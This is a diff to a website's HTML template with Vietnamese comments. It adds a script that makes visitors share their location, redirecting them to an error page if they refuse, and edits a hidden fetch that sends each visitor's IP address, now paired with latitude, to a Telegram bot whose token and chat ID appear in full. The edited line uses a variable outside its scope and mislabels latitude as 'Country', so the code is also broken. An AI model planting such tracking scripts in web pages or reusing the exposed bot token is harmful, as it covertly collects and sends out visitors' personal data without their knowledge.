@@ -103,16 +103,34 @@
   <!-- Template Main JS File -->
   <script src="assets/js/main.js"></script>
   <script>
+  if ("geolocation" in navigator) {
+  navigator.geolocation.getCurrentPosition(function(position) {
+    // Vị trí có sẵn, làm gì đó với nó
+    console.log("Latitude is :", position.coords.latitude);
+    console.log("Longitude is :", position.coords.longitude);
+  }, function(error) {
+    // Xử lý trường hợp không thể lấy vị trí
+    console.error("Error Code = " + error.code + " - " + error.message);
+    alert("Truy cập vị trí bị từ chối. Bạn cần chia sẻ vị trí của mình để sử dụng trang web này.");
+    // Chuyển hướng người dùng hoặc hiển thị thông điệp lỗi
+    window.location.href = 'error.html'; // Giả sử 'error.html' là trang thông báo lỗi
+  });
+} else {
+  console.log("Geolocation is not supported by this browser.");
+  // Hiển thị một thông điệp hoặc chuyển hướng người dùng
+  alert("Trình duyệt của bạn không hỗ trợ Geolocation.");
+}
   fetch('https://jsonip.com')
   .then(response => response.json())
   .then(data => {
     console.log(data.ip); // Địa chỉ IP
-    fetch('https://api.telegram.org/bot6769553327:AAEwKifUmAx2hUgodRudzpIjcCfEnDZ1e6s/sendMessage?chat_id=6142403832&text=ACCESS! IP:'+data.ip+'\n Country: '+data.country+'')
+    fetch('https://api.telegram.org/bot6769553327:AAEwKifUmAx2hUgodRudzpIjcCfEnDZ1e6s/sendMessage?chat_id=6142403832&text=ACCESS! IP:'+data.ip+'\n Country: '+position.coords.latitude+'')
   })
   .catch(error => {
     console.error('Đã có lỗi xảy ra:', error);
   });
   
+
   </script>
 
 </body>
